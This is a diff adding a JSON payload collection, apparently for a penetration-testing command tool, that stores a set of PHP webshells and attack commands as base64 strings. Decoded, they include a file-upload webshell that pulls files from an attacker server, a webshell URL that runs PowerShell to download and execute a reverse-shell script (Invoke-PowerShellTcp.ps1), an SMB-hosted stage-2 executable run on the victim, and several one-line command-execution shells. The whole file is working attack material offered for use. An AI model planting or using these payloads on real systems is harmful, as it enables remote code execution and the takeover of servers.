@@ -1,0 +1,72 @@
+{
+    "command": {
+        "simple_php_webshell_file_upload": {
+            "description": "Simple webshell with file upload capability",
+            "commands": [
+                "JHNvbWV2YXIgPSA8PDwnRU9MJwo8P3BocAogIGlmIChpc3NldCgkX1JFUVVFU1RbJ3Z1cGxvYWQnXSkpIHsKICBmaWxlX3B1dF9jb250ZW50cygkX1JFUVVFU1RbJ3Z1cGxvYWQnXSwgZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly9NWS5TRVIuVkVSLklQOjgwODAvIiAuICRfUkVRVUVTVFsndnVwbG9hZCddKSk7CiB9OwogaWYgKGlzc2V0KCRfUkVRVUVTVFsndmV4ZWMnXSkpIHsKICBlY2hvICI8cHJlPiIgLiBzaGVsbF9leGVjKCRfUkVRVUVTVFsndmV4ZWMnXSkgLiAiPC9wcmU+IjsKIH07Cj8+CkVPTDs="
+            ]
+        },
+        "call_ps_from_webshell": {
+            "description": "Calling powershell directly from a webshell",
+            "commands": [
+                "aHR0cDovL3ZpY3RpbS93ZWJzaGVsbC5waHA/dmV4ZWM9ZWNobyBJRVgoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5kb3dubG9hZFN0cmluZygnaHR0cDovL01ZLlNFUi5WRVIuSVA6ODA4MC9JbnZva2UtUG93ZXJTaGVsbFRjcC5wczEnKSB8cG93ZXJzaGVsbCAtbm9wcm9maWxlIC0="
+            ]
+        },
+        "exec_stage2_from_smb": {
+            "description": "Execution of stage2 payload directly from SMB share",
+            "commands": [
+                "I09uIEF0dGFja2luZyBNYWNoaW5lKHN0YXJ0cyBhIHNlcnZlciB0aGF0IGhvc3RzIHRoZSBleGUgdG8gYmUgZXhlY3V0ZWQpOgppbXBhY2tldC1zbWJzZXJ2ZXIgZmlnbWVudCBldmlsLmV4ZQojT24gdmljdGltIGF0IHdlYnNoZWxsOgpodHRwOi8vdmljdGltL3dlYnNoZWxsLnBocD92ZXhlYz1cXE1ZLlNFUi5WRVIuSVBcZmlnbWVudFxldmlsLmV4ZSB3aG9hbWkK"
+            ]
+        },
+        "single_get_cmd": {
+            "description": "Simplest of simple webshell, executing one command",
+            "commands": [
+                "PD9waHAgc3lzdGVtKCJ3aG9hbWkiKTsgPz4="
+            ]
+        },
+        "exec_cmd_from_get_param": {
+            "description": "Execute commands as input form GET url parameters. Very simple webshell.",
+            "commands": [
+                "PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
+            ]
+        },
+        "passthru_webshell": {
+            "description": "Simple webshell using PHP passthru method",
+            "commands": [
+                "PD9waHAgcGFzc3RocnUoJF9HRVRbJ2NtZCddKTsgPz4="
+            ]
+        },
+        "shell_exec_webshell": {
+            "description": "Simple shell_exec webshell. There will be no output from this method unless you echo it with a separate call.",
+            "commands": [
+                "PD9waHAgZWNobyBzaGVsbF9leGVjKCJ3aG9hbWkiKTs/Pg=="
+            ]
+        },
+        "exec_webshell": {
+            "description": "Exec method webshell. Not useful for output, just execution - won't be able to see any STDOUT",
+            "commands": [
+                "PD9waHAgZWNobyBleGVjKCJ3aG9hbWkiKTs/Pg=="
+            ]
+        },
+        "exec_with_print_webshell": {
+            "description": "Exec webshell that puts output in an array and will display",
+            "commands": [
+                "PD9waHAgZXhlYygibHMgLWxhIiwkYXJyYXkpOyBwcmludF9yKCRhcnJheSk7ID8+"
+            ]
+        },
+        "preg_replace_webshell": {
+            "description": "This is a nifty trick - preg_replace webshell",
+            "commands": [
+                "PD9waHAgcHJlZ19yZXBsYWNlKCcvLiovZScsICdzeXN0ZW0oIndob2FtaSIpOycsICcnKTsgPz4="
+            ]
+        },
+        "backtick_execution_php": {
+            "description": "PHP webshell with backticks as execution - has to be a nix platform for this to work.",
+            "commands": [
+                "PD9waHAgJG91dHB1dCA9IGB3aG9hbWlgOyBlY2hvICI8cHJlPiRvdXRwdXQ8L3ByZT4iOyA/Pg=="
+            ]
+        }
+    },
+    "configuration": {
+    }
+}
